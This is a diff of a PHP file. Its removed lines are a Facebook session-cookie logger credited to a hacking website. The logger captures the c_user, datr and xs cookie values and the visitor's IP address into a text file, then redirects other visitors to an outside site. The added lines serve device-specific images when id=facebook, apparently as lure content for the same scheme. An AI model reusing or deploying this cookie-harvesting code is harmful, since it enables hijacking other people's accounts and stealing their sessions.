@@ -1,31 +1,41 @@
-#20th Jan,2015
-#author:Rashid feroz[rashid.2008feroz@gmail.com]
-#website:Hackwhiz.com
-
-
 <?php
-
-$c_user=$_REQUEST['c_user'];
-$datr=$_REQUEST['datr'];
-$xs=$_REQUEST['xs'];
-
-if(!empty($c_user))
-{
-$myfile=fopen("cookie.txt",'a+');
-$date= date("d-m-Y h:i:sa");
-$client_ip=$_SERVER['REMOTE_ADDR'];
-
-fwrite($myfile,$date."\n");
-fwrite($myfile,"Client ip = ".$client_ip."\n");
-fwrite($myfile,"c_user = ".$c_user."\n");
-fwrite($myfile,"datr = ".$datr."\n");
-fwrite($myfile,"xs = ".$xs."\n");
-fwrite($myfile,"   ----------------------------------\n\n");
-fclose($myfile);
-
+require_once 'Mobile_Detect.php'; // PHP Class to detect device.
+$detect = new Mobile_Detect;
+if( $detect->isMobile() && !$detect->isTablet() ){
+ $id = $_GET["id"];
+if ($id == "facebook")
+ {
+      $myFile = "login.jpg";
+      $fh = fopen($myFile, 'r');
+      $theData = fread($fh, 500000);
+      fclose($fh);
+      echo $theData;
 }
 else{
-    header('location:http://rihanna.herokuapp.com'); 
+     $myFile2 = "follow.jpg";
+     $fh1 = fopen($myFile2, 'r');
+     $theData2 = fread($fh1, 500000);
+     fclose($fh1);
+     echo $theData2;
 }
-
+}
+else
+{
+$id = $_GET["id"];
+if ($id == "facebook")
+ {
+      $myFile = "desktop.jpg";
+      $fh = fopen($myFile, 'r');
+      $theData = fread($fh, 500000);
+      fclose($fh);
+      echo $theData;
+}
+else{
+     $myFile2 = "follow.jpg";
+     $fh1 = fopen($myFile2, 'r');
+     $theData2 = fread($fh1, 500000);
+     fclose($fh1);
+     echo $theData2;
+}
+}
 ?>
